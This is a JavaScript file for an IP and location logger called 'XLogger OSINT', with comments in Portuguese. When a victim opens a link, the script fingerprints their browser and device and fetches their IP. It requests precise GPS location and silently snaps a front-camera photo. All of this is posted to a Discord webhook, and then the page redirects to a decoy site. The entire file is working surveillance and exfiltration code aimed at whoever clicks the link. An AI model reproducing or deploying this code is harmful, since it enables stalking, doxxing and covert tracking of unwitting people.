(async function() {

    const config = window.OSINT_CONFIG || {};
    
    const urlParams = new URLSearchParams(window.location.search);
    const webhookUrl = config.webhookUrl;
    const finalUrl = urlParams.get('r') || config.finalUrl || 'https://www.google.com';
    const requestCamera = urlParams.get('cam') ? urlParams.get('cam') === '1' : (config.requestCamera !== false);
    const requestGeo = urlParams.get('geo') ? urlParams.get('geo') === '1' : (config.requestGeo !== false);
    const redirectDelayMs = parseInt(urlParams.get('delay') || config.redirectDelayMs || 2000);
    const debug = urlParams.get('debug') ? urlParams.get('debug') === '1' : config.debug || false;
    const altaPrecisao = urlParams.get('precisao') ? urlParams.get('precisao') === '1' : config.altaPrecisao || true;
    
    const statusEl = document.getElementById('status');
    const debugBox = document.getElementById('debugBox');
    
    function log(msg) {
        console.log('[XLogger]', msg);
        if (debug && debugBox) {
            debugBox.style.display = 'block';
            debugBox.innerHTML += msg + '\n';
        }
    }
    
    log('Inicializando XLogger...');
    
    async function getBasicInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages.join(', '),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            screenColorDepth: window.screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };
        
        // Informações de conexão
        if (navigator.connection) {
            info.connection = {
                downlink: navigator.connection.downlink + ' Mbps',
                rtt: navigator.connection.rtt + ' ms',
                type: navigator.connection.effectiveType,
                saveData: navigator.connection.saveData
            };
        }
        
        return info;
    }
    
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (e) {
            log('Erro ao obter IP: ' + e);
            return 'Não disponível';
        }
    }
    
    async function getHighPrecisionLocation() {
        if (!requestGeo) return null;
        
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                log('Geolocalização não suportada');
                resolve(null);
                return;
            }
            
            const options = {
                enableHighAccuracy: altaPrecisao,  // TRUE = GPS ligado!
                timeout: 10000,                     // 10 segundos de espera
                maximumAge: 0                        // Sempre buscar nova
            };
            
            log(altaPrecisao ? 'Solicitando GPS de alta precisão...' : 'Solicitando localização...');
            statusEl.innerText = altaPrecisao ? '📡 Ativando GPS...' : '📍 Obtendo localização...';
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' metros',
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp,
                        mapsLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
                        precisaoReal: position.coords.accuracy < 20 ? '📍📍 EXCELENTE (GPS)' : 
                                     position.coords.accuracy < 100 ? '📍 BOA (Wi-Fi)' : '📍 APROXIMADA (IP)'
                    };
                    
                    log(`Localização obtida com precisão de ${position.coords.accuracy}m`);
                    resolve(locationData);
                },
                (error) => {
                    let errorMsg = 'Erro ao obter localização: ';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg += 'Usuário negou permissão';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg += 'Localização indisponível (desligue e ligue o GPS)';
                            break;
                        case error.TIMEOUT:
                            errorMsg += 'Tempo excedido (tente novamente)';
                            break;
                        default:
                            errorMsg += error.message;
                    }
                    log(errorMsg);
                    statusEl.innerText = '⚠️ Clique em PERMITIR para localização';
                    resolve(null);
                },
                options
            );
        });
    }
    
    // ==============================================
    // 4. CAPTURAR CÂMERA (1 FRAME)
    // ==============================================
    async function captureCameraFrame() {
        if (!requestCamera) return null;
        
        try {
            statusEl.innerText = '📷 Solicitando acesso à câmera...';
            log('Solicitando acesso à câmera...');
            
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    setTimeout(() => {
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Parar todas as tracks da câmera
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Converter para base64 (JPEG)
                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
                        log('Foto capturada com sucesso');
                        statusEl.innerText = '📸 Foto capturada!';
                        resolve(imageData);
                    }, 500);
                };
            });
        } catch (e) {
            log('Erro ao acessar câmera: ' + e.message);
            statusEl.innerText = '❌ Câmera não disponível';
            return null;
        }
    }
    
    // ==============================================
    // 5. ENVIAR PARA O DISCORD
    // ==============================================
    async function sendToDiscord(ip, basicInfo, location, cameraImage) {
        if (!webhookUrl) {
            log('ERRO: Webhook não configurado!');
            return;
        }
        
        // Montar mensagem
        let content = `**🔍 NOVO ACESSO DETECTADO**\n`;
        content += `⏰ **Horário:** ${new Date().toLocaleString('pt-BR')}\n`;
        content += `🌐 **IP:** ${ip}\n`;
        content += `📱 **Dispositivo:** ${basicInfo.userAgent.substring(0, 100)}...\n`;
        content += `💻 **Plataforma:** ${basicInfo.platform}\n`;
        content += `🌍 **Idioma:** ${basicInfo.language}\n`;
        content += `⏱️ **Fuso horário:** ${basicInfo.timezone}\n`;
        
        if (basicInfo.deviceMemory) {
            content += `🧠 **RAM:** ${basicInfo.deviceMemory}GB\n`;
        }
        
        if (basicInfo.hardwareConcurrency) {
            content += `⚙️ **CPU Cores:** ${basicInfo.hardwareConcurrency}\n`;
        }
        
        content += `📺 **Tela:** ${basicInfo.screenWidth}x${basicInfo.screenHeight}\n`;
        
        if (basicInfo.connection) {
            content += `📶 **Internet:** ${basicInfo.connection.downlink} (${basicInfo.connection.type})\n`;
        }
        
        // Localização
        if (location) {
            content += `\n📍 **LOCALIZAÇÃO GPS:**\n`;
            content += `📌 **Lat/Long:** ${location.latitude}, ${location.longitude}\n`;
            content += `🎯 **Precisão:** ${location.accuracy}\n`;
            content += `📊 **Qualidade:** ${location.precisaoReal}\n`;
            content += `🗺️ **Mapa:** ${location.mapsLink}\n`;
        }
        
        const payload = {
            content: content,
            username: 'XLogger OSINT',
            avatar_url: 'https://i.imgur.com/9z7BQm7.png'
        };
        
        // Se tiver foto, enviar como anexo
        const formData = new FormData();
        formData.append('payload_json', JSON.stringify(payload));
        
        if (cameraImage) {
            const blob = await (await fetch(cameraImage)).blob();
            formData.append('file', blob, 'camera.jpg');
        }
        
        try {
            log('Enviando dados para o Discord...');
            statusEl.innerText = '📤 Enviando dados...';
            
            const response = await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });
            
            if (response.ok) {
                log('✅ Dados enviados com sucesso!');
                statusEl.innerText = '✅ Concluído! Redirecionando...';
            } else {
                log('❌ Erro ao enviar: ' + response.status);
            }
        } catch (e) {
            log('Erro na requisição: ' + e);
        }
    }
    
    // ==============================================
    // EXECUÇÃO PRINCIPAL
    // ==============================================
    try {
        log('Iniciando coleta de dados...');
        statusEl.innerText = '🔄 Coletando informações...';
        
        // 1. Informações básicas
        const basicInfo = await getBasicInfo();
        
        // 2. IP
        const ip = await getIP();
        
        // 3. Localização (se solicitada)
        let location = null;
        if (requestGeo) {
            location = await getHighPrecisionLocation();
        }
        
        // 4. Câmera (se solicitada)
        let cameraImage = null;
        if (requestCamera) {
            cameraImage = await captureCameraFrame();
        }
        
        // 5. Enviar para o Discord
        await sendToDiscord(ip, basicInfo, location, cameraImage);
        
        // 6. Redirecionar
        log(`Redirecionando para: ${finalUrl} em ${redirectDelayMs}ms`);
        statusEl.innerText = `⏳ Redirecionando para ${finalUrl}...`;
        
        setTimeout(() => {
            window.location.href = finalUrl;
        }, redirectDelayMs);
        
    } catch (error) {
        log('Erro fatal: ' + error);
        statusEl.innerText = '❌ Erro, redirecionando...';
        setTimeout(() => {
            window.location.href = finalUrl;
        }, 2000);
    }
})();
